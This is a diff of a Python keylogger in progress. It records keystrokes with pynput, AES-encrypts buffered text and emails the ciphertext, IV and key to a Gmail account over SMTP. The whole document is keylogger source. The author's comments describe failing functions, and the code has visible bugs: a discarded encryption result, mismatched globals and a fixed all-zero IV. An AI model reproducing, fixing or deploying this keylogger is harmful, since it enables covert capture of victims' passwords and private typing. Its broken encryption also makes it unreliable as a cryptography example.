@@ -3,10 +3,11 @@
 #Imports
 import getpass
 import smtplib
-import Cryptodome
-import pyaes, pbkdf2, binascii, os, secrets
-from pynput.keyboard import Key, Listener
-from Crypto.Random import get_random_bytes
+import base64
+import hashlib
+from Crypto.Cipher import AES
+from pynput.keyboard import Key, Controller, Listener
+from Crypto import Random
 
 
 
@@ -31,18 +32,18 @@ email = input('Enter Your Email: ')
 password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
+password = input('Enter your desired AES Password: ')
+print('Everything is setup, the keylogger may start')
 
 #Defining the essential variables
-converted_key = ''
-converted_iv = ''
 key = ''
+key_bytes = ''
 plaintext = ''
 ciphertext = ''
-data_to_be_encrypted = ''
+raw = ''
 data_to_be_sent = ''
 full_log = ''
 word = ''
-email_char_lim = 50
 iv = ''
 
 #Building the keylogger (seems to work just fine)
@@ -56,12 +57,13 @@ def on_press(key):
         word += ' '
         full_log += word
         word = ''
-    if len(full_log) >= email_char_lim:
-            data_to_be_encrypted = full_log
-            full_log = ''
-            if len(data_to_be_encrypted) >= email_char_lim:
-               encryption()
-               data_to_be_encrypted = ''
+        if len(full_log) == 32:
+              data_to_be_encrypted = full_log
+              full_log = ''
+              encrypt(data_to_be_encrypted, password)
+              data_to_be_encrypted = ''
+              send_log()
+              ciphertext = ''
            
     elif key == Key.shift_l or key == Key.shift_r:
            return
@@ -77,59 +79,49 @@ def on_press(key):
 
 #My most precious fucking encryption function i swear i will fucking kill this piece of shit code
 
-def encryption():
-    global converted_iv
-    global converted_key
-    global email_char_lim
-    global key
-    global iv
-    global ciphertext
-    global plaintext
-    global data_to_be_sent
-    global data_to_be_encrypted
-    password = "passw0rd"
-    key = get_random_bytes(32)
-    iv = secrets.randbits(256)
-    plaintext = data_to_be_encrypted
-    aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
-    ciphertext = aes.encrypt(plaintext)
-    data_to_be_sent = ciphertext
-    print(key)
-    print(iv)
-    converted_iv = str(iv)
-    converted_key = str(key)
+def pad_message(data_to_be_encrypted):
+    while len(data_to_be_encrypted)% 16 != 0:
+      data_to_be_encrypted = data_to_be_encrypted + " "
+    return data_to_be_encrypted
+
+def encrypt(data_to_be_encrypted, password):
+
+    
+    private_key = hashlib.sha256(password.encode("utf-8")).digest()
+    mode = AES.MODE_CBC
+    padded_message = pad_message(data_to_be_encrypted)
+    iv = 16 * b'\x00'
+    cipher = AES.new(private_key, mode, iv)
+    ciphertext = cipher.encrypt(padded_message)
+    print(ciphertext)
+    return ciphertext, iv, private_key
+
+
     
     
-    #if the lenght of the ciphertext is more than the limit everything gets reseted
-    if len(data_to_be_sent) >= email_char_lim:
-        send_log()
-        data_to_be_encrypted = ''
-        plaintext = ''
-        full_log = ''
-        data_to_be_sent = ''
-        ciphertext = ''
+
 
 
 
 #This shit ddefines the send_log function which does not seem to work cuz int object has no attribute 'lower'
 def send_log():
-  global converted_iv
-  global converted_key
-  global data_to_be_sent
+  global iv
+  global key
+  global ciphertext
   server.sendmail(
           email,
           email,
-          data_to_be_sent
+          ciphertext
      )
   server.sendmail(
           email,
           email,
-          converted_iv
+          iv
      )
   server.sendmail(
           email,
           email,
-          converted_key
+          key
      )
 #This stuff starts the listener shit
 with Listener( on_press=on_press ) as listener:
